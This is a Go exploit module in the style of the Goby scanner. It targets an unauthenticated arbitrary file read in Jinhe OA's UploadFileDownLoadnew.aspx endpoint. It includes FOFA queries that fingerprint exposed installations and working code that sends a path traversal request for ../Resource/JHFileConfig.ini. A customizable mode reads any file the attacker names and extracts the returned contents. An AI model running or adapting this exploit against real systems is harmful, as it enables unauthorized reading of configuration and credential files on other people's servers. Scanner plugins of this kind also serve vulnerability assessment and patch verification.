package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"

	"git.gobies.org/goby/goscanner/jsonvul"

	"git.gobies.org/goby/goscanner/scanconfig"

	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx File Read Vulnerability",
    "Description": "<p>The Jinhe OA /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx component component has a arbitrary file reading vulnerability. Unauthenticated attackers may exploit this vulnerability to read any file in the system, including sensitive files, configuration files, and database files.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-08-13",
    "PostTime": "2024-08-13",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\\\"\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\"))",
    "GobyQuery": "(title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || body=\"href=\\\"/jc6/platform/\\\"\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\"))",
    "Level": "1",
    "Impact": "<p>This vulnerability could lead to the leakage of sensitive information, such as system configurations and database information, which could be exploited by attackers for further attacks, such as system privilege escalation and data tampering.</p>",
    "Recommendation": "<p>Follow the official patch release information, apply patches or upgrade to the latest version.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "JHFileConfig,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../Resource/JHFileConfig.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.5",
    "Translation": {
        "CN": {
            "Name": "金和OA /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx 文件读取漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和OA&nbsp; /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx存在任意文件读取漏洞。未经身份验证的攻击者可能通过该漏洞读取系统中的任意文件，包括敏感文件、配置文件和数据库文件等<br></p>",
            "Recommendation": "<p>关注官方补丁发布信息，打上补丁或者升级到最新版本。<br></p>",
            "Impact": "<p>此漏洞可能导致敏感信息泄露，如系统配置、数据库信息等，从而被攻击者利用进行进一步的攻击，如系统提权、数据篡改等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Jinhe OA /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx File Read Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>The Jinhe OA /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx component component has a arbitrary file reading vulnerability. Unauthenticated attackers may exploit this vulnerability to read any file in the system, including sensitive files, configuration files, and database files.<br></p>",
            "Recommendation": "<p>Follow the official patch release information, apply patches or upgrade to the latest version.<br></p>",
            "Impact": "<p>This vulnerability could lead to the leakage of sensitive information, such as system configurations and database information, which could be exploited by attackers for further attacks, such as system privilege escalation and data tampering.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9930"
}`
	postOrGet_Eartxo := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		path := "/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=" + fileUrl

		getRequest := httpclient.NewGetRequestConfig(hostInfo.FixedHostInfo + path)
		getRequest.Timeout = 12
		getRequest.VerifyTls = false
		getRequest.FollowRedirect = false
		getRequest.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
		getRequest.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		getRequest.Header.Store("Accept-Encoding", "gzip, deflate, br")
		getRequest.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		getRequest.Header.Store("Connection", "close")

		resp, err := httpclient.DoHttpRequest(hostInfo, getRequest)
		if err != nil || resp == nil {
			return "", err
		}

		return resp.RawBody, nil
	}

	extractRelevantInfo_aoxjr := func(content string) string {
		re := regexp.MustCompile(`(?s)\[JHFile\].*?(1)=\d+`)
		matches := re.FindAllString(content, -1)
		return strings.Join(matches, "\n")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//	vulURL := "/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx"
			defaultModeMap := map[string]string{
				"../Resource/JHFileConfig.ini": "[JHFile]",
			}
			uploadFileFunc := postOrGet_Eartxo

			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					ss.VulURL = u.HostInfo + "/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx"
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			mode := goutils.B2S(ss.Params["mode"])

			defaultModeMap := map[string]struct {
				FileURL      string
				ExpectedText string
			}{
				"JHFileConfig": {"../Resource/JHFileConfig.ini", "[JHFile]"},
			}

			uploadFileFunc := postOrGet_Eartxo

			var fileUrl, fileText string

			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if modeInfo, ok := defaultModeMap[mode]; ok {
					fileUrl = modeInfo.FileURL
					fileText = modeInfo.ExpectedText
				} else {
					expResult.Success = false
					return expResult
				}
			}

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			// 使用新函数提取所需信息
			relevantInfo := extractRelevantInfo_aoxjr(resp)
			expResult.Output = "Extracted relevant information:\n" + relevantInfo
			return expResult
		},
	))
}
